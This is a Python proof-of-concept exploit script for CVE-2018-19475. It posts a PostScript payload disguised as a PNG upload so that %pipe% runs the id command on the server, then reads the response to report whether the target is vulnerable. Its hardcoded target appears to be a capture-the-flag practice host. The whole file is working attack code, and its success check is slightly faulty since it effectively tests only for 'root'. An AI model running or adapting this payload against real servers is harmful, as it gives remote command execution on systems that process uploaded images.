import requests


def poc(host, port, timeout):
    try:
        url = f'http://{host}:{port}/'
        # files = {'file_upload': ('333.png',
        #                          '%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file\n')}
        # headers = {
        #     'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryfHmUI12CQfQstekf',
        #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'
        # }
        files = {'file_upload': ('333.png',
                                 '%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file\n',
                                 'image/png')}

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': f'http://{host}:{port}/',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'
        }

        res = requests.post(url, files=files, headers=headers)
        # print(res.text)
        if 'uid' and 'root' in res.text:
            print('true')
            return 'CVE-2018-19475 is vuln'
        # if "apache flink" in res.text.lower():
        #     return "Apache_Flink upload file to rce"
    except Exception as e:
        pass
    return None


poc('node4.buuoj.cn', '25367', 200)